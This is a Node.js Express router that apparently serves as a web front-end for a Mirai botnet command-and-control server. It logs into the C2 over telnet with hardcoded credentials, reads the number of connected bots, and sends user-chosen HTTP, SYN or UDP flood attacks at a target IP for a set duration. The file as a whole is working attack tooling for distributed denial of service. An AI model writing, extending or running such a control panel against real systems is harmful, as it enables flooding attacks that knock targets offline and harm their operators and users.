const express = require('express');
const router = express.Router();
const net = require('net');
const stripAnsi = require('strip-ansi');
const events = require('events');

const eventEmitter = new events.EventEmitter();

let client;
let botsNumber = 0;
let connecting;

function checkIfReturnedAttackType(arrToMatch, string) {
    let matching = false;
    for (let stringToMatch of arrToMatch) {
        if (string.includes(stringToMatch)) {
            matching = true;
        }
    }
    return matching;
}

/* GET encrypt page. */
router.get('/', function (req, res, next) {
    res.render('loading');

});

router.get('/main', function (req, res, next) {
    console.log(botsNumber);
    connecting = false;
    if(!client) {
        res.redirect('/');
    } else {
        res.render('main', {botsNumber: botsNumber});
    }
});

router.get('/err', function (req, res, next) {
    console.log(botsNumber);
    res.render('err');
});

router.get('/connect', function (req, res, next) {
    connecting = true;
    try {
        client = net.connect(23, "10.10.10.2");
        client.on('data', function(data) {
            //console.log('data_raw:', data);
            if(data.includes("botcount")) {
                const botsConnected = stripAnsi(data.toString()).match(/botcount\s{2}:\s(\d+)/);
                if (!botsConnected) {
                    console.log("0 bots connected!");
                    botsNumber = 0;
                } else {
                    botsNumber = parseInt(botsConnected[1], 10);
                }
                connecting = false;
                res.status(200).send("Connected!");
                console.log(botsConnected);
            }
            if(data.includes(" before sending another attack")) {
                const attackError = (stripAnsi(data.toString()).split('\r\n')).filter(line => line.includes(" before sending another attack"))[0];
                console.log(attackError);
                eventEmitter.emit('failure', attackError);
            }
            else if(stripAnsi(data.toString()) && checkIfReturnedAttackType(['http', 'syn', 'udp'], stripAnsi(data.toString()))) {
                eventEmitter.emit('attack');
                console.log("Attack started!");
            }
        });
        client.on('error', function(e) {
            console.log('error');
            console.log(connecting);
            if (connecting) {
                connecting = false
                res.status(501).send("Couldn't connect to the server!");
            } else {
                eventEmitter.emit('failure', "Couldn't connect to the botnet!");
            }
        });
        client.on('close', function(e) {
            console.log('Connection finished');
            // res.status(501).send("Disconnected from server!");
        });
        client.write('y\n');
        client.write('mirai_project\n');
        client.write('qwerty\n');
        client.write('botcount\n');
    } catch(err) {
        console.log(err);
        res.status(501).send("Couldn't connect!");
    }
    // setTimeout(function () {
    //     // after 2 seconds
    //     console.log("Redirect!");
    //     res.status(200).message("Connected!");
    // }, 2000);
});

router.post('/attack', function (req, res) {
    console.log(req.body);
    let responseSent = false;
    const attackSuccessListener = function attackSuccessListener() {
        setTimeout(function () {
            // timeout after 2 seconds for error
            if (!responseSent) {
                responseSent = true;
                res.status(200).send("Attack started!");
                eventEmitter.removeListener('attack', attackSuccessListener);
                eventEmitter.removeListener('failure', attackFailureListener);
            }
        }, 2000);
    }
    const attackFailureListener = function attackFailureListener(msg) {
        responseSent = true;
        console.log("Failure!");
        res.status(501).send(msg);

        eventEmitter.removeListener('attack', attackSuccessListener);
        eventEmitter.removeListener('failure', attackFailureListener);
    }
    eventEmitter.addListener('attack', attackSuccessListener);
    eventEmitter.addListener('failure', attackFailureListener);
    const timeSplitted = req.body.attackDuration.split(':');
    const attackDuration = parseInt(timeSplitted[0], 10) * 60 +  parseInt(timeSplitted[1], 10);
    console.log(client);
    console.log(`${req.body.attackType} ${req.body.targetIP} ${attackDuration}\n`);
    client.write(`${req.body.attackType} ${req.body.targetIP} ${attackDuration}\n`);
    setTimeout(function () {
            // timeout after 15 seconds
            if (!responseSent) {
                res.status(501).send("Something went wrong!");
            }
        }, 15000);
});
module.exports = router;

